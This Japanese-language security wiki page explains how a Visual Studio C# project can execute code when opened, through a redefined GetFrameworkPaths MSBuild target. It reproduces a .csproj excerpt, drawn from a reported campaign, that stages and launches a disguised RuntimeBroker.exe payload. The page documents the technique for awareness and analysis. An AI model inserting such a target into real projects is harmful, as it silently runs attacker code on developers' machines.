# Visual Studio プロジェクトのデザイン時 MSBuild 実行

{{#include ../banners/hacktricks-training.md}}

Visual Studio で C# プロジェクトを開くのは、単に内容を読むだけではありません。デザイン時ビルドでは、開発者が Build または Run を選択する**前に**、IntelliSense、参照、デバッグを初期化するため、名前付きの MSBuild ターゲットが呼び出されます。`GetFrameworkPaths` はそのようなターゲットの1つです。これを再定義したプロジェクトは、別途 payload をクリックさせることなく、プロジェクトの読み込み時にユーザー権限でコードを実行できます。<sup>[[1]](#references)[[2]](#references)</sup>

報告されたプロジェクトはリソースファイルを宣言し、その後、置き換えたターゲット内で `MakeDir`、`Copy`、`Exec` を使用して、同じディレクトリにある payload を配置し、起動しました。この抜粋は、ソースの Figure 6 に示された実行経路を抜粋したものです。単独の XML ファイルではなく、`.csproj` 内に記述します。<sup>[[1]](#references)</sup>

```xml
<ItemGroup>
  <ResourceFiles Include="Resources\**\*.*" />
</ItemGroup>
<Target Name="GetFrameworkPaths">
  <MakeDir Directories="$(LocalAppData)\Microsoft\RuntimeBrokers" />
  <Copy SourceFiles="@(ResourceFiles)"
        DestinationFolder="$(LocalAppData)\Microsoft\RuntimeBrokers\%(RecursiveDir)"
        SkipUnchangedFiles="true" />
  <Exec Command='start "" "$(LocalAppData)\Microsoft\RuntimeBrokers\RuntimeBroker.exe"' />
</Target>
```

**Import order matters:** MSBuild はターゲットの *最後の定義* を使用します。プロジェクトファイルに記述したターゲットが、後からインポートされた定義によって再定義される場合、Microsoft のターゲットを置き換えるとは限りません。`<Project Sdk="...">` を使う SDK スタイルのプロジェクトでは、プロジェクト本体の後に SDK ターゲットが暗黙的にインポートされるため、どのプロジェクトでもこのオーバーライドが機能すると決めつけず、評価後のインポート順を確認してください。`MSBuild.exe -preprocess:expanded.xml project.csproj` は、プロジェクトをビルドせずにインポートを展開するため、有効なターゲット定義を見つけるのに役立ちます。<sup>[[3]](#references)[[4]](#references)</sup>

これは開発者プロジェクトの実行経路であり、VSIX 拡張機能のインストールでも、それ自体で権限昇格につながるものでもありません。ステージングされた実行ファイルが悪意のある隣接する `.exe.config` や DLL を使用している場合は、[AppDomainManager hijacking and DLL sideloading](windows-local-privilege-escalation/dll-hijacking/) を参照してください。

## References

- [1] [Unit 42 - Blinder Tunnel キャンペーン、イラクのインフラを標的に](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
- [2] [Microsoft Learn - Visual Studio との統合 (MSBuild)](https://learn.microsoft.com/en-us/visualstudio/msbuild/visual-studio-integration-msbuild?view=visualstudio)
- [3] [Microsoft Learn - MSBuild ターゲット](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-targets)
- [4] [Microsoft Learn - MSBuild コマンドライン リファレンス](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-command-line-reference?view=visualstudio)
{{#include ../banners/hacktricks-training.md}}
